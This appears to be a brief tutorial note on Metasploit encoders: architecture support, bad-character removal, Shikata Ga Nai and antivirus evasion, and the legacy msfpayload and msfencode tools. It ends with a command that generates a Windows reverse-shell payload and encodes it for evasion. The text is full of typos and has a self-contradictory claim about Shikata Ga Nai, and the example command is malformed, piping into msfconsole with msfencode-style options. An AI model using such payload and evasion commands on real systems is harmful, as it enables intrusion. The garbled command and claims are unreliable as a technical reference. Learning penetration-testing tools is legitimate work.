# Metasploit

## Encoders

Over the 15 years of existence of the Metasploit Framework, Encoders 
have assisted with making payload compatible with different processor 
architectures while at the same time helping with antivirus evasion. 
Encoders come into play with the role of  changin the payload to run on 
different operating systems and architectures. these architectures include:

```
x64     x86     sparc       ppc     mips
```

They are also needed to remove hexademcimal opcodes known as bad 
characters from the payload. Not only that but encoding the payload in 
different formats could help with the AV detection as mentioned above. 
However, the se of encoders strictly for AV evasion has dimished over 
time, as IPS/IDS manufacturers have improved how their protection software deals with signatures in malware and viruses.


Shikata Ga Nai (SGN) is one of the most utilized Encoding schemes
today because it is so hard to detect that payloads encoded through 
its mechanism are not universally undetectable anumore. Far fro it.
The name (仕方がない) means It cannot be helped or Nothing can be done 
about it, and rightfully so if we were reading this a few years ago.
However, there are another methodologies we will explore to evade 
protecion systems. This arcticle from FireEye details the why and the 
how of Shijata Ga Nai's previous rule over the other encoders.

## Selecting an Encoder
Before 2015, the Metasploit Framework had different submodules that 
took care of payload and encoders. They were packet separately from 
the msfconsole script and were called msfpayload and msfencode. These 
two tools are located in ```/usr/share/framework2```



Example of msfpayload

```bash
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfconsole -b '\x00' -f perl -e x86/shikata_ga_nai
```